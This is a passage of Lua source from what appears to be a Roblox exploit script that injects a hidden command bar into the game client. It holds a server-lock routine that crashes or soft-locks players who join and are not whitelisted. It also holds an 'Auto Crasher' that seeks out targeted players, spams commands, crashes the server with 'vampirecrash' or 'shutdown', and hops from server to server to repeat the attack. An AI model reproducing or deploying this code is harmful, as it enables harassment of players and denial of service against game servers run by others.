        if ServerLocked and not table.find(Whitelisted,Player.Name) and not table.find(ServerLockedProtection,Player.Name) then
                if ServerLockedSoundEnabled then
                    spawn(function()
                        GUI:SendMessage(ScriptName, "This server is currently locked.")
                    end)
                    wait(0.1)
                    repeat wait() until Player and Player.Character
                    wait(0.25)
			if OldServerLock then
				spawn(function()
					game.Players:Chat("music "..tostring(ServerLockedSound))
					wait(10)
					game.Players:Chat("music nan")
				end)
				runCommand(prefix.."softlock",{Player.Name})
			else
                    		runCommand(prefix.."rocketcrashsound",{Player.Name,ServerLockedSound})
			end
                else
                    spawn(function()
                        GUI:SendMessage(ScriptName, "This server is currently locked.")
                    end)
                    wait(0.1)
                    repeat wait() until Player and Player.Character
                    wait(0.25)
			if OldServerLock then
				runCommand(prefix.."softlock",{Player.Name})
			else
                    		runCommand(prefix.."rocketcrash",{Player.Name})
			end
                end
            end
    end)
end

Connections.PlayerAdded = game.Players.PlayerAdded:Connect(PlayerAdded)
for i,v in pairs(game.Players:GetPlayers()) do PlayerAdded(v) end

spawn(function()
if not (Settings["Auto Crasher"]["Enabled"] and Settings["Auto Crasher"]["Ignore Autorun Commands"]) then
for i,v in pairs(Settings["Autorun Commands"]) do
    if not running then return end
    local BM = v:split(" ")
    local commandname = prefix..BM[1]:lower()
    local t = ""
    table.remove(BM,1)
    local findargs = {}
    for i,v2 in pairs(BM) do
        table.insert(findargs,v2)
        t=t..v2.." "
    end
    spawn(function()runCommand(commandname,findargs)end)
    if consoleOn then
    print("autorunning command: "..commandname.." "..t)
    end
end 
end end)

spawn(function()
local UI = Instance.new("ScreenGui")
CommandBar = UI
local dairyQueenBalls = Instance.new("TextButton")
local holyshidt11 = Instance.new("TextBox")
local togglegarbage41923812 = false
local isCmdBarOpen = false
UI.Name = "&!)!@@#$(~(UI"
UI.Parent = game.CoreGui
UI.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
UI.DisplayOrder = 2147483647
UI.ResetOnSpawn = false
dairyQueenBalls.Name = "dairyQueenBalls"
dairyQueenBalls.Parent = UI
dairyQueenBalls.AnchorPoint = Vector2.new(1, 1)
dairyQueenBalls.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
dairyQueenBalls.BackgroundTransparency = 1.000
dairyQueenBalls.BorderSizePixel = 0
dairyQueenBalls.Position = UDim2.new(1, 0, 1, 0)
dairyQueenBalls.Size = UDim2.new(0, 61, 0, 61)
dairyQueenBalls.Font = Enum.Font.Roboto
dairyQueenBalls.Text = "]"
dairyQueenBalls.TextColor3 = Color3.fromRGB(255, 255, 255)
dairyQueenBalls.TextSize = 75.000
dairyQueenBalls.TextStrokeTransparency = 0.000
dairyQueenBalls.TextWrapped = true
holyshidt11.Name = "holyshidt11"
holyshidt11.Parent = dairyQueenBalls
holyshidt11.AnchorPoint = Vector2.new(1, 0)
holyshidt11.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
holyshidt11.BackgroundTransparency = 0.750
holyshidt11.BorderSizePixel = 5
holyshidt11.BorderMode = "Inset"
holyshidt11.Size = UDim2.new(0, 0, 0, 61)
holyshidt11.Visible = false
holyshidt11.Font = Enum.Font.Code
holyshidt11.Text = ""
holyshidt11.AutomaticSize="X"
holyshidt11.TextColor3 = Color3.fromRGB(255, 255, 255)
holyshidt11.TextSize = 50.000
holyshidt11.TextStrokeTransparency = 0.000
holyshidt11.TextXAlignment = Enum.TextXAlignment.Right
--local actextbox=holyshidt11:Clone()

	function openUI()
	    isCmdBarOpen=true
	    togglegarbage41923812=true
		holyshidt11:CaptureFocus()
		holyshidt11.Visible=true
		game:GetService("TweenService"):Create(holyshidt11,TweenInfo.new(1,Enum.EasingStyle.Quad,Enum.EasingDirection.InOut,0,false,0),{Size=UDim2.new(0,200,0,61)}):Play()
		game:GetService("RunService").RenderStepped:Wait()
		holyshidt11.Text=""
	end
	
	Connections[tostring(math.random(-9999999,9999999))] = game:GetService("UserInputService").InputBegan:Connect(function(key,gp)
	if not gp then
	if key.KeyCode==Enum.KeyCode.RightBracket then
	openUI()
	end
	else
	    if key.KeyCode==Enum.KeyCode.Tab then
	        if #holyshidt11.Text:split(" ")==1 then
    	    local s,f=pcall(function()
    	    local text=holyshidt11.Text
    	    game:GetService("RunService").RenderStepped:Wait()
    	    holyshidt11.Text=getCommand(text)[1][1]
    	    holyshidt11.CursorPosition=#holyshidt11.Text+1
	        end)
	        else
	            local s,f=pcall(function()
        	    local text=holyshidt11.Text
        	    local message = ""
                for i=1, #text:split(" ") do
                    if i ~= #text:split(" ") then
                        message = message.." "..text:split(" ")[i]
                    end
                end
                message=message:sub(2,#message)
                local player = GetPlayers(text:split(" ")[#text:split(" ")])
                player=player[1]
        	    game:GetService("RunService").RenderStepped:Wait()
        	    holyshidt11.Text=message.." "..player.Name
        	    holyshidt11.CursorPosition=#holyshidt11.Text+1
    	        end)
	        end
	end
	end
	end)
	Connections[tostring(math.random(-9999999,9999999))] = game:GetService("RunService").RenderStepped:Connect(function()
	    if UI.dairyQueenBalls.holyshidt11.Size == UDim2.new(0,0,0,61) then
            UI.dairyQueenBalls.holyshidt11.Visible=false
        else
            UI.dairyQueenBalls.holyshidt11.Visible=true
        end
	end)
	Connections[tostring(math.random(-9999999,9999999))] = dairyQueenBalls.MouseButton1Click:Connect(openUI)
	Connections[tostring(math.random(-9999999,9999999))] = holyshidt11.FocusLost:Connect(function(shouldSend)
	spawn(function()
	        isCmdBarOpen=false
			game:GetService("TweenService"):Create(holyshidt11,TweenInfo.new(1,Enum.EasingStyle.Quad,Enum.EasingDirection.InOut,0,false,0),{Size=UDim2.new(0,0,0,61)}):Play()
			holyshidt11.Text=""
	end)
		if shouldSend then
			local BM = holyshidt11.Text:split(" ")
				local commandname = BM[1]:lower()
				if string.sub(commandname,0,#prefix) ~= prefix then commandname=prefix..commandname end
				local t = ""
				table.remove(BM,1)
				local findargs = {}
				for i,v in pairs(BM) do
					table.insert(findargs,v)
					t=t..v.." "
				end
				spawn(function()runCommand(commandname,findargs)end)
if consoleOn then print("running command: "..commandname.." "..t)end
		end
	end)
end)

task.spawn(function()
	if Settings["Auto Crasher"]["Enabled"] then
		local WhitelistedFound = false
		if not (Settings["Auto Crasher"]["Targetted Players"]["Enabled"] and Settings["Auto Crasher"]["Targetted Players"]["Ignore Whitelisted"]) then
			print("Ignore whitelisted is OFF")
			for i,v in pairs(game.Players:GetPlayers()) do
				if table.find(Settings["Auto Crasher"]["Whitelisted Players"],v.Name) then
					WhitelistedFound = true
					GUI:SendMessage(ScriptName, "Whitelisted player ("..v.DisplayName..") found, skipping server.")
				end
			end
		end
		if not WhitelistedFound then
			if Settings["Auto Crasher"]["Targetted Players"]["Enabled"] then
				print("ok les go")
				local TargettedFound = false
				for i,v in pairs(game.Players:GetPlayers()) do
					if table.find(Settings["Auto Crasher"]["Targetted Players"]["Players"],v.Name) then
						TargettedFound = true
					end
				end
				if not TargettedFound then
					GUI:SendMessage(ScriptName, "Targetted players not found, skipping server.")
				else
					if Settings["Auto Crasher"]["Message"] then
						GUI:SendMessage(ScriptName, Settings["Auto Crasher"]["Message"])
					end
					for i,v in pairs(Settings["Auto Crasher"]["Commands"]) do
						game.Players:Chat(v)
						if Settings["Auto Crasher"]["Command Delay"] ~= -1 then
							wait(Settings["Auto Crasher"]["Command Delay"])
						end
					end
					if Settings["Auto Crasher"]["Time Before Crash"] ~= -1 then
						wait(Settings["Auto Crasher"]["Time Before Crash"])
					end
					if Settings["Auto Crasher"]["Crash"] then
						if Settings["Auto Crasher"]["Vampire"] then
							runCommand(prefix.."vampirecrash",{})
						else
							runCommand(prefix.."shutdown",{})
						end
					end
				end
			else
				print("ok les no")
				if Settings["Auto Crasher"]["Message"] then
					GUI:SendMessage(ScriptName, Settings["Auto Crasher"]["Message"])
				end
				for i,v in pairs(Settings["Auto Crasher"]["Commands"]) do
					game.Players:Chat(v)
					if Settings["Auto Crasher"]["Command Delay"] ~= -1 then
						wait(Settings["Auto Crasher"]["Command Delay"])
					end
				end
				if Settings["Auto Crasher"]["Time Before Crash"] ~= -1 then
					wait(Settings["Auto Crasher"]["Time Before Crash"])
				end
				if Settings["Auto Crasher"]["Crash"] then
					if Settings["Auto Crasher"]["Vampire"] then
						runCommand(prefix.."vampirecrash",{})
					else
						runCommand(prefix.."shutdown",{})
					end
				end
			end
		end
		while true do
			wait(Settings["Auto Crasher"]["Serverhop Time"])
			if Settings["Auto Crasher"]["Targetted Players"]["Enabled"] and Settings["Auto Crasher"]["Targetted Players"]["Use Join Player"] then
				runCommand(prefix.."joinplayer",{Settings["Auto Crasher"]["Targetted Players"]["Players"][math.random(1,#Settings["Auto Crasher"]["Targetted Players"]["Players"])],"silent"})
			else
				if Settings["Auto Crasher"]["Skip Crashed Servers"] then
					runCommand(prefix.."savehop",{})
				else
					runCommand(prefix.."serverhop",{})
				end
			end
		end
	else
		GUI:SendMessage(ScriptName, Settings["Welcome Message"])
	end
end)
print("Loaded in "..tostring(os.clock()-loadtime).."s / "..tostring(math.floor((os.clock()-loadtime)*1000)).."ms")